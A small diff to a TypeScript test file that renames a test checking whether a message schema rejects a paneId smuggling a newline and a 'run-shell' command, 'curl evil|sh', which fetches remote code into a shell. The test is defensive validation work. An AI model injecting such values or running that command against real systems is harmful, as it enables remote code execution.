@@ -32,7 +32,7 @@ describe('MuxClientMessageSchema', () => {
     }
   });
 
-  test('rejects paneId carrying a tmux command-injection newline', () => {
+  test('rejects paneId carrying a command-injection newline', () => {
     const evil = { type: 'select-pane', sessionId: 's1', paneId: "%0\nrun-shell 'curl evil|sh'" };
     expect(MuxClientMessageSchema.safeParse(evil).success).toBe(false);
   });
